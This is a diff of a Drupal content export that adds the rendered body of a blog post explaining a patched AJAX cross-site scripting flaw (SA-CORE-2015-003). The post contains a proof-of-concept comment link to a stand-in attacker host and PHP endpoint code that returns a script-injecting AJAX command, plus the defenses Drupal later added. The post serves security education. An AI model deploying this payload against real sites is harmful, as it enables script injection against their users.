@@ -8,7 +8,6 @@ type:
     target_uuid: a90c00e7-fd49-42a6-8cdb-e99ec16f7742
 revision_timestamp:
   - value: '2020-01-27T17:48:12+00:00'
-    format: 'Y-m-d\TH:i:sP'
 revision_uid:
   - target_type: user
     target_uuid: 30bffdc0-96b3-4656-9078-3f8113359c60
@@ -22,10 +21,8 @@ title:
   - value: 'Getting creative with Drupal XSS'
 created:
   - value: '2017-05-28T15:52:44+00:00'
-    format: 'Y-m-d\TH:i:sP'
 changed:
   - value: '2020-01-27T17:48:12+00:00'
-    format: 'Y-m-d\TH:i:sP'
 promote:
   - value: true
 sticky:
@@ -37,7 +34,6 @@ revision_translation_affected:
 path:
   - alias: /blog/getting-creative-drupal-xss
     langcode: en
-    pathauto: 1
 body:
   - value: |
       <p>In the world of web security, cross-site scripting (XSS) vulnerabilities are extremely common, and will continue to be a problem as web applications become increasingly complex. According to a 2016 report by Bugcrowd, a popular bug bounty site,&nbsp;<strong>“XSS vulnerabilities account for 66% of valid submissions, followed by 20% categorized as CSRF”</strong>&nbsp;(<a href="https://pages.bugcrowd.com/hubfs/PDFs/state-of-bug-bounty-2016.pdf">source</a>). That same report goes into some detail about the severity of XSS (page 23), which is worth reading to understand the scope of this kind of attack.</p>
@@ -135,6 +131,72 @@ body:
 
       <p>because it’s unlikely that you’ll get that lucky. 😁</p>
     format: full_html
+    processed: |
+      <p>In the world of web security, cross-site scripting (XSS) vulnerabilities are extremely common, and will continue to be a problem as web applications become increasingly complex. According to a 2016 report by Bugcrowd, a popular bug bounty site,&nbsp;<strong>“XSS vulnerabilities account for 66% of valid submissions, followed by 20% categorized as CSRF”</strong>&nbsp;(<a href="https://pages.bugcrowd.com/hubfs/PDFs/state-of-bug-bounty-2016.pdf">source</a>). That same report goes into some detail about the severity of XSS (page 23), which is worth reading to understand the scope of this kind of attack.</p>
+      <p>Drupal developers are mostly protected from XSS by the HTML filtering system, but custom code can still allow attacks using unconventional exploits.</p>
+      <p>For a simple web application, finding an XSS vulnerability may seem trivial. Looking at online resources, you often find code snippets like this:</p>
+      <figure>
+      <pre>
+      <code data-lang="php" class=" hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>Search results for "<span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> $_GET[<span class="hljs-string">'q'</span>]; <span class="hljs-meta">?&gt;</span></span>":<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></code></pre></figure>
+      <p>but now-a-days, finding an exploit this obvious is unlikely, unless you’re looking at something completely hand-built. Drupal 8 makes code like this is even more unlikely, given that the templating system has moved to Twig, which escapes output by default and does not allow arbitrary PHP statements.</p>
+      <p>So what kind of Drupal code can trigger XSS? Let’s look at a practical example based on&nbsp;<a href="https://www.drupal.org/SA-CORE-2015-003">SA-CORE-2015-003</a>, which was a security release I helped out on.</p>
+      <p><em>Note: The following exploit has already been fixed, don’t freak out!</em></p>
+      <p>Drupal has an internal AJAX system that responds to events on HTML elements, reaching out to a JSON endpoint to perform what’s known as AJAX commands. An example of this is the autocomplete element, which triggers AJAX requests as a user types to determine autocomplete suggestions.</p>
+      <p>You can enhance your HTML elements with this behavior like so:</p>
+      <figure>
+      <pre>
+      <code data-lang="javascript" class=" hljs css"><span class="hljs-selector-tag">Drupal</span><span class="hljs-selector-class">.ajax</span>({
+        <span class="hljs-attribute">url</span>: <span class="hljs-string">'/foo'</span>,
+        event: <span class="hljs-string">'click'</span>,
+        element: $(<span class="hljs-string">'#my-great-link'</span>),
+      });</code></pre></figure>
+      <p>but to make things easier for developers, Drupal will automatically bind AJAX behaviors to any element with the “use-ajax” class. This may not seem like a big deal, but many Drupal sites allow users to input HTML, and classes are often allowed in default text filters.</p>
+      <p>To re-cap, this is what we know at this point:</p>
+      <ol>
+      <li>Drupal allows users to enter HTML by default in areas like comments</li>
+      <li>The XSS filtering in Drupal is really good, so assume we can’t bypass it</li>
+      <li>The class attribute is allowed in the default text filter</li>
+      <li>The AJAX system automatically binds on elements with the “use-ajax” class</li>
+      </ol>
+      <p>Knowing this, we can make a comment like this:</p>
+      <figure>
+      <pre>
+      <code data-lang="html" class=" hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"http://mynastysite.com/xss.php"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"use-ajax"</span>&gt;</span>Click me!<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre></figure>
+      <p>and know that when the link is clicked, a POST request is made to an arbitrary URL, and Drupal will parse the response and process AJAX commands.</p>
+      <p>The xss.php script on our endpoint could look something like this:</p>
+      <figure>
+      <pre>
+      <code data-lang="php" class=" hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span>
+
+      <span class="hljs-comment">// Only display the spoof response if the method is POST, this way normal users</span>
+      <span class="hljs-comment">// (i.e. non-admins) will see a normal page.</span>
+      <span class="hljs-keyword">if</span> ($_SERVER[<span class="hljs-string">'REQUEST_METHOD'</span>] === <span class="hljs-string">'POST'</span>) {
+        <span class="hljs-comment">// Allow any site to make a POST request here.</span>
+        header(<span class="hljs-string">'Access-Control-Allow-Origin: *'</span>);
+        <span class="hljs-comment">// Form a bare-bones JSON response for Drupal.</span>
+        $foo = <span class="hljs-keyword">new</span> stdClass();
+        $foo-&gt;command = <span class="hljs-string">'insert'</span>;
+        $foo-&gt;data = <span class="hljs-string">'&lt;script&gt;alert("xss")&lt;/script&gt;'</span>;
+        $foo-&gt;method = <span class="hljs-string">'append'</span>;
+        $foo-&gt;selector = <span class="hljs-string">'body'</span>;
+        <span class="hljs-keyword">echo</span> json_encode(<span class="hljs-keyword">array</span>($foo));
+      }
+      <span class="hljs-comment">// Display the normal page for GET requests.</span>
+      <span class="hljs-keyword">else</span> {
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h1&gt;This is a normal site!&lt;/h1&gt;"</span>;
+      }</span></code></pre></figure>
+      <p>Now when a user clicks our link, we can execute arbitrary Javascript in Drupal!</p>
+      <p>The Drupal security team has since improved the AJAX system by adding two layers of defense:</p>
+      <ol>
+      <li>When an AJAX-enabled element triggers its event (i.e. is clicked), Drupal verifies that the URL is local before making the request (see&nbsp;<a href="http://cgit.drupalcode.org/drupal/tree/core/misc/drupal.js?id=d5d37e06490825d10c52545433773e22fe6b61fb#n146">Drupal.url.isLocal</a>).</li>
+      <li>If a response does not contain a X-Drupal-Ajax-Token header, it is not processed. This prevents users from making local requests to uploaded files (see&nbsp;<a href="http://cgit.drupalcode.org/drupal/tree/core/misc/ajax.js?id=d5d37e06490825d10c52545433773e22fe6b61fb#n220">Drupal.Ajax.options.success</a>).</li>
+      </ol>
+      <p>This has been fixed for about two years, but it’s a great example of how complex XSS vulnerabilities in Drupal can be.</p>
+      <p>My biggest takeaway from this is that&nbsp;<em>you don’t need to bypass the XSS filter to trigger XSS.</em>&nbsp;Get creative with your research, and don’t hope to find quick-win exploits in code like:</p>
+      <figure>
+      <pre>
+      <code data-lang="twig" class=" hljs twig"><span class="hljs-template-variable">{{ twig_input | raw }}</span></code></pre></figure>
+      <p>because it’s unlikely that you’ll get that lucky. 😁</p>
     summary: ''
 field_tags:
   - target_type: taxonomy_term
